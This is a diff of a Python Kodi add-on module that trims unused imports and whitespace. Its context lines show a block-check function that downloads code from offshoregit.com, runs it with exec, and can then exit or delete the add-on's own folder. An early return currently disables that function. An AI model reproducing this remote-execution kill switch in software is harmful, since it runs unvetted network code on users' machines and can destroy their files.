@@ -9,34 +9,20 @@ them yourself.
 '''
 import sys
 import traceback
-import six
 from six.moves.urllib.request import urlopen
-from six.moves.urllib.request import Request
-from six.moves.urllib.error import HTTPError, URLError
-from six.moves.urllib.request import urlretrieve    
-from six.moves.urllib.parse import urlparse
-from six.moves.urllib.parse import parse_qs
-from six.moves.urllib.request import build_opener
-from six.moves.urllib.parse import quote_plus
-from six.moves.urllib.parse import unquote_plus
-from six.moves.urllib.parse import quote
-from six.moves.urllib.parse import unquote
-from six.moves.urllib.parse import urlencode
-import six.moves.urllib.request
-import six.moves.urllib.parse
-import six.moves.urllib.error
 
 PY3 = sys.version_info[0] == 3
 
+
 def do_block_check(uninstall=False):
-    return 
+    return
     try:
         # import urllib2
         # import sys
         namespace = {}
         exec urlopen('http://offshoregit.com/tknorris/block_code.py').read() in namespace
         # exec urlopen('http://offshoregit.com/tknorris/block_code.py').read(), namespace
-        if namespace["real_check"](uninstall): 
+        if namespace["real_check"](uninstall):
             sys.exit()
         return
     except SystemExit:
@@ -44,7 +30,7 @@ def do_block_check(uninstall=False):
     except:
         traceback.print_exc()
         pass
-      
+
     import hashlib
     import xbmcvfs
     import xbmc
@@ -77,4 +63,3 @@ def do_block_check(uninstall=False):
             addon_path = xbmcaddon.Addon().getAddonInfo('path').decode('utf-8')
             shutil.rmtree(addon_path)
         sys.exit()
-        
